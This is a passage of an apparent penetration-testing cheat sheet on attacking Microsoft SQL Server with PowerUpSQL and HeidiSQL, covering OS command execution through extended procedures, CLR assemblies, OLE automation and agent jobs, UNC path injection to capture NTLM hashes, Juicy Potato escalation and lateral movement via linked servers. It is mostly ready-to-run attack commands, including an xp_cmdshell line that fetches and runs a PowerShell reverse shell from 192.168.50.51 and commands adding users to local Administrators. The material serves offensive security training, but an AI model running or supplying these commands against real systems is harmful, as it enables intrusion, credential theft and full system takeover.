</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLOSCmd</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Command</span> <span class=s2>&#34;whoami&#34;</span>
</span></span></code></pre></div><p>If you want to use windows authentication do not user username parameter but launch a Powershell session as the desired user.</p></li></ul><h4 id=sysadmin-to-os-service-account---command-execution-with-extended-stored-procedures>Sysadmin to OS Service Account - Command Execution with extended stored procedures</h4><ul><li><p><code>PowerUpSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Create the DLL with desired commands</span>
</span></span><span class=line><span class=cl><span class=nb>Create-SQLFileXpDll</span> <span class=n>-OutFile</span> <span class=s2>&#34;C:\fileserver\xp_calc.dll&#34;</span>  <span class=n>-Command</span> <span class=s2>&#34;calc.exe&#34;</span> <span class=n>-ExportName</span> <span class=s2>&#34;xp_calc&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Add the DLL as a stored procedure</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLQuery</span> <span class=n>-UserName</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Query</span> <span class=s2>&#34;sp_addextendedproc &#39;xp_calc&#39;, &#39;\\192.168.15.2\fileserver\xp_calc.dll&#39;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List existing Extended stored procedures</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLStoredProcedureXP</span> <span class=n>-UserName</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Execute the stored procedure</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLQuery</span> <span class=n>-UserName</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Query</span> <span class=s2>&#34;EXEC xp_calc&#34;</span>
</span></span></code></pre></div></li><li><p><code>HeidiSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- sp_addextendedproc can be used to register the stored procedure. Note that the function name in the DLL and the command must exactly be the same (case-sensitive)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>sp_addextendedproc</span><span class=w> </span><span class=s1>&#39;xp_calc&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;C:\mydll\xp_calc.dll&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Execute the stored procedure 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>EXEC</span><span class=w> </span><span class=n>xp_calc</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Drop the stored procedure 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>sp_dropextendedproc</span><span class=w> </span><span class=s1>&#39;xp_calc&#39;</span><span class=w>
</span></span></span></code></pre></div><p>Code sample for DLL can be found here:</p><ul><li><a href=https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp target=_blank rel=noopener>https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp</a></li><li><a href=https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extendedstored-procedure target=_blank rel=noopener>https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extendedstored-procedure</a></li></ul></li></ul><h4 id=sysadmin-to-os-service-account---command-execution-with-clr-assemblies>Sysadmin to OS Service Account - Command Execution with CLR assemblies</h4><ul><li><p><code>HeidiSQL</code>:</p><ol><li><p>Creating the DLL using the file <strong>cmd_exec.cs</strong>.</p></li><li><p>Compile the DLL that can be loaded from a local path or a UNC path:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>.</span><span class=n>NET</span><span class=p>\</span><span class=n>Framework64</span><span class=p>\</span><span class=n>v4</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=mf>30319</span><span class=p>\</span><span class=n>csc</span><span class=p>.</span><span class=py>exe</span> <span class=p>/</span><span class=n>target</span><span class=err>:</span><span class=n>library</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>labuser</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>cmd_exec</span><span class=p>.</span><span class=py>cs</span>
</span></span></code></pre></div></li><li><p>Execute the commands:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1>-- Enable CLR 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>use</span><span class=w> </span><span class=n>msdb</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Enable show advanced options on the server 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;show advanced options&#39;</span><span class=p>,</span><span class=mi>1</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>RECONFIGURE</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Enable CLR on the server 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;clr enabled&#39;</span><span class=p>,</span><span class=mi>1</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>RECONFIGURE</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Import the assembly and use the stored procedure: 
</span></span></span><span class=line><span class=cl><span class=c1>---- Import the assembly from a file (UNC Path)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>CREATE</span><span class=w> </span><span class=n>ASSEMBLY</span><span class=w> </span><span class=n>my_assembly</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=s1>&#39;\\192.168.15.2\fileserver\cmd_exec.dll&#39;</span><span class=w> </span><span class=k>WITH</span><span class=w> </span><span class=n>PERMISSION_SET</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>UNSAFE</span><span class=p>;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>---- Link the assembly to a stored procedure 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>CREATE</span><span class=w> </span><span class=k>PROCEDURE</span><span class=w> </span><span class=p>[</span><span class=n>dbo</span><span class=p>].[</span><span class=n>cmd_exec</span><span class=p>]</span><span class=w> </span><span class=o>@</span><span class=n>execCommand</span><span class=w> </span><span class=n>NVARCHAR</span><span class=w> </span><span class=p>(</span><span class=mi>4000</span><span class=p>)</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=k>EXTERNAL</span><span class=w> </span><span class=n>NAME</span><span class=w> </span><span class=p>[</span><span class=n>my_assembly</span><span class=p>].[</span><span class=n>StoredProcedures</span><span class=p>].[</span><span class=n>cmd_exec</span><span class=p>];</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>cmd_exec</span><span class=w> </span><span class=s1>&#39;whoami&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Cleanup 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>DROP</span><span class=w> </span><span class=k>PROCEDURE</span><span class=w> </span><span class=n>cmd_exec</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>DROP</span><span class=w> </span><span class=n>ASSEMBLY</span><span class=w> </span><span class=n>my_assembly</span><span class=w>
</span></span></span></code></pre></div><p>Reference: <a href=https://blog.netspi.com/attacking-sql-server-clr-assemblies/ target=_blank rel=noopener>https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></p></li></ol></li><li><p><code>PowerUpSQL</code>:</p><ol><li>Following command can be used to create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Create-SQLFileCLRDll</span> <span class=n>-ProcedureName</span> <span class=s2>&#34;runcmd&#34;</span> <span class=n>-OutFile</span> <span class=s2>&#34;runcmd&#34;</span> <span class=n>-OutDir</span> <span class=s2>&#34;C:\Users\labuser\Desktop&#34;</span>
</span></span></code></pre></div><ol start=2><li>Import the stored procedure from the generated string:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>CREATE</span><span class=w> </span><span class=n>ASSEMBLY</span><span class=w> </span><span class=p>[</span><span class=n>NMfsa</span><span class=p>]</span><span class=w> </span><span class=k>AUTHORIZATION</span><span class=w> </span><span class=p>[</span><span class=n>dbo</span><span class=p>]</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=mi>0</span><span class=n>x4D5A90</span><span class=err>……</span><span class=w>
</span></span></span></code></pre></div><ol start=3><li>Below command can be used to list all the stored procedures added using CLR:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLStoredProcedureCLR</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><ol start=4><li>Use below for automated enabling, executing command and reading output using CLR assembly:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLOSCmdCLR</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Command</span> <span class=s2>&#34;whoami&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLOSCmdCLR</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Command</span> <span class=s2>&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li></ul><h4 id=sysadmin-to-os-service-account---command-execution-with-ole-automation-procedures>Sysadmin to OS Service Account - Command Execution with OLE Automation Procedures</h4><ul><li><p><code>HeidiSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1>-- Enable Ole Automation Stored Procedures 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;show advanced options&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>RECONFIGURE</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;Ole Automation Procedures&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>RECONFIGURE</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>GO</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Execute command
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>DECLARE</span><span class=w> </span><span class=o>@</span><span class=k>output</span><span class=w> </span><span class=nb>INT</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>DECLARE</span><span class=w> </span><span class=o>@</span><span class=n>ProgramToRun</span><span class=w> </span><span class=nb>VARCHAR</span><span class=p>(</span><span class=mi>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SET</span><span class=w> </span><span class=o>@</span><span class=n>ProgramToRun</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Run(&#34;calc.exe&#34;)&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_oacreate</span><span class=w> </span><span class=s1>&#39;wScript.Shell&#39;</span><span class=p>,</span><span class=w> </span><span class=o>@</span><span class=k>output</span><span class=w> </span><span class=k>out</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_oamethod</span><span class=w> </span><span class=o>@</span><span class=k>output</span><span class=p>,</span><span class=w> </span><span class=o>@</span><span class=n>ProgramToRun</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_oadestroy</span><span class=w> </span><span class=o>@</span><span class=k>output</span><span class=w>
</span></span></span></code></pre></div></li></ul><h4 id=sysadmin-to-os-service-account---command-execution-with-agent-jobs>Sysadmin to OS Service Account - Command Execution with Agent Jobs</h4><p>SQL Server Agent is a Windows service that executes scheduled tasks or jobs:</p><ul><li>Subsystem PowerShell</li><li>Subsystem CmdExec</li><li>Subsystem VBScript</li><li>Subsystem Jscript</li></ul><ol><li><p>Execute commands:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLOSCmdAgentJob</span> <span class=n>-Subsystem</span> <span class=n>PowerShell</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Command</span> <span class=s2>&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> <span class=n>-Verbose</span> 
</span></span></code></pre></div></li><li><p>List all jobs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLAgentJob</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>Password</span> <span class=s2>&#34;Pass@123&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li></ol><h4 id=sysadmin-to-os-service-account---command-execution-with-external>Sysadmin to OS Service Account - Command Execution with external</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLOSCmdR</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Command</span> <span class=s2>&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLOSCmdPython</span> <span class=n>-Username</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-Command</span> <span class=s2>&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Reference:</p><ul><li><a href=https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 target=_blank rel=noopener>https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5</a></li><li><a href=https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server target=_blank rel=noopener>https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</a></li></ul><h3 id=public-to-os-service-account>Public to OS Service Account</h3><h4 id=public-to-os-service-account---unc-path-injection>Public to OS Service Account - UNC Path Injection</h4><p>A very well known method to capture Net-NTLM (also known as NTLMv1/v2) hashes. Stored procedures like <strong>xp_dirtree</strong> and <strong>xp_fileexist</strong> can be used to capture Net-NTLM hashes. The captured hashes can be cracked using John-the-Ripper, Hashcat etc</p><p>PowerUpSQL automates this impressively (uses Inveigh <a href=https://github.com/Kevin-Robertson/Inveigh target=_blank rel=noopener>https://github.com/Kevin-Robertson/Inveigh</a> as a capture server):</p><ol><li>Gets SQL Server SPNs</li><li>Attempt to log into each</li><li>Performs UNC path injection</li><li>Capture password hashes</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLUncPathInjection</span> <span class=n>-Verbose</span> <span class=n>-CaptureIp</span> <span class=p>[</span><span class=no>ATTACKER_IP</span><span class=p>]</span> 
</span></span></code></pre></div><p>More in UNC Path Injection cheatsheet: <a href=https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e target=_blank rel=noopener>https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a></p><p>If the process cannot be automatized, it is necessary first to start on a machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Inveigh</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=p>.\</span><span class=n>Inveigh</span><span class=p>.</span><span class=py>psd1</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Inveigh</span> <span class=n>-FileOutput</span> <span class=n>Y</span>
</span></span></code></pre></div><p>then on HeidiSQL connect to the database and execute one of the following queries by replacing the correct attacker IP:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_dirtree</span><span class=w> </span><span class=s1>&#39;\\attackerip\file&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_fileexist</span><span class=w> </span><span class=s1>&#39;\\attackerip\file&#39;</span><span class=w>
</span></span></span></code></pre></div><h3 id=os-service-account-to-local-system>OS Service Account to Local SYSTEM</h3><h4 id=os-service-account-to-local-system---rotten-potato>OS Service Account to Local SYSTEM - Rotten Potato</h4><p>Reference: <a href=https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ target=_blank rel=noopener>https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a></p><h4 id=os-service-account-to-local-system---juicy-potato>OS Service Account to Local SYSTEM - Juicy Potato</h4><p>Reference: <a href=https://github.com/ohpe/juicy-potato target=_blank rel=noopener>https://github.com/ohpe/juicy-potato</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Listener</span>
</span></span><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-v</span> <span class=n>-p</span> <span class=mf>443</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get command execution</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerLinkCrawl</span> <span class=n>-Instance</span> <span class=n>INSTANCE</span> <span class=n>-Query</span> <span class=s2>&#34;EXEC master..xp_cmdshell &#39;powershell.exe iex (iwr http://192.168.50.51/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.51 -Port 443&#39;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Grab Juicy potato</span>
</span></span><span class=line><span class=cl><span class=nb>wget </span><span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>192.168</span><span class=p>.</span><span class=py>50</span><span class=p>.</span><span class=mf>51</span><span class=p>/</span><span class=nb>juicy-potato</span><span class=n>-master</span><span class=p>/</span><span class=n>JuicyPotato</span><span class=p>/</span><span class=n>JuicyPotato</span><span class=p>.</span><span class=py>exe</span> <span class=n>-UseBasicParsing</span> <span class=n>-Outfile</span> <span class=n>juicypotato</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>EXEC</span> <span class=n>master</span><span class=p>..</span><span class=py>xp_cmdshell</span> <span class=s1>&#39;powershell -ep bypass -c wget &#39;&#39;http://192.168.50.53:8888/JuicyTomato.exe&#39;&#39; -OutFile c:\Users\Public\JuicyTomato.exe&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># own</span>
</span></span><span class=line><span class=cl><span class=p>./</span><span class=n>juicypotato</span><span class=p>.</span><span class=py>exe</span> <span class=n>-t</span> <span class=p>*</span> <span class=n>-p</span> <span class=n>c:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>System32</span><span class=p>\</span><span class=n>cmd</span><span class=p>.</span><span class=py>exe</span> <span class=n>-a</span> <span class=s2>&#34;/c net localgroup Administrators DOMAIN\USER /add&#34;</span> <span class=n>-l</span> <span class=mf>8000</span>
</span></span><span class=line><span class=cl><span class=n>EXEC</span> <span class=n>master</span><span class=p>..</span><span class=py>xp_cmdshell</span> <span class=s1>&#39;powershell -ep bypass -c c:\users\public\JuicyTomato.exe -t * -p c:\Windows\System32\cmd.exe -a &#39;&#39;/c net localgroup Administrators usfun\pastudent53 /add&#39;&#39; -l 8000&#39;</span>
</span></span></code></pre></div><h3 id=local-admin-to-sysadmin>Local Admin to Sysadmin</h3><p>Extract service account credentials from LSA Secrets and/or memory, Token Impersonation for the SQL Server service, single user mode etc. are very well known methods.</p><p>Impersonating the SQL Server service account (sysadmin) using the PowerUpSQL function InvokeSQLImpersonateService that wraps Joe Bialek’s Invoke-TokenManipulation:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLImpersonateService</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><h2 id=lateral-movement>Lateral Movement</h2><p>Once we move to the OS layer by executing OS commands, it is possible to move laterally to spread our access. SQL Servers provide various possibilities for lateral movement:</p><ul><li><strong>Shared Service Accounts</strong> = Domain user or Domain admin (OS layer)</li><li><strong>SQL Server Links</strong> = Move laterally in the database layer</li></ul><h3 id=shared-service-accounts>Shared Service Accounts</h3><p><strong>Why should I care about SQL Servers that share service accounts?</strong></p><ul><li>SysAdmins can execute OS commands</li><li>OS commands run as the SQL Server service account</li><li>Service accounts have sysadmin privileges by default</li><li>Companies often use a single domain account to run hundreds of SQL Servers</li><li>So if you get sysadmin on one server you have it on all of them!</li></ul><p>Check if current user has sa privs on a SQL instance:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLServerInfo</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Check for alternate creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=n>runas</span> <span class=p>/</span><span class=n>noprofile</span> <span class=p>/</span><span class=n>netonly</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=p>&lt;</span><span class=n>domain</span><span class=p>\</span><span class=n>username</span><span class=p>&gt;</span> <span class=n>powershell</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLServerInfo</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Note that if we have access to hashes or tickets of any user, it always pay to check if that user is sysadmin on any database in the domain.</p><p>A user with public (everyone) role can be used to enumerate domain accounts and groups in the forest and other trusted forests by fuzzing the values to SUSER_NAME function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLFuzzDomainAccount</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1.cybercorp.local&#34;</span> <span class=n>-StartId</span> <span class=mf>500</span> <span class=n>-EndId</span> <span class=mf>2000</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLFuzzDomainAccount</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-StartId</span> <span class=mf>500</span> <span class=n>-EndId</span> <span class=mf>2000</span> <span class=n>-Verbose</span> <span class=n>-Domain</span> <span class=s2>&#34;evilcorp.local&#34;</span>
</span></span></code></pre></div><h3 id=sql-server-links>SQL Server Links</h3><p><strong>What’s a SQL Server Link?</strong></p><ul><li>Database links are basically persistent database connections for SQL Servers.</li><li>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources (Access, Excel, Oracle etc.).</li><li>In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.</li><li>Database links work across SQL server versions and even across forest trusts.</li></ul><p><strong>Why should I care about SQL Server Links?</strong></p><ul><li>Short answer = privilege escalation</li><li>Links can be accessed by the public role via openquery</li><li>Links are often configured with excessive privileges so they can allow you to impersonate logins on remote servers.</li><li>xp_cmdshell and other command can be ran through</li><li>Links can be crawled.</li></ul><p>SQL Server links can be exploited by:</p><ul><li><p><code>HeidiSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1>-- Look for links to remote servers (public privs are enough)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>sysservers</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Run the same query on linked databases.Openquery() function can be used to run queries on a linked database 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>openquery</span><span class=p>(</span><span class=s2>&#34;SQLServer2&#34;</span><span class=p>,</span><span class=s1>&#39;select * from master..sysservers&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Openquery queries can be chained to access links within links (nested links) 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>openquery</span><span class=p>(</span><span class=s2>&#34;SQLServer2&#34;</span><span class=p>,</span><span class=s1>&#39;select * from openquery(&#34;SQLServer3&#34;,&#39;&#39;select * from master..sysservers&#39;&#39;)&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
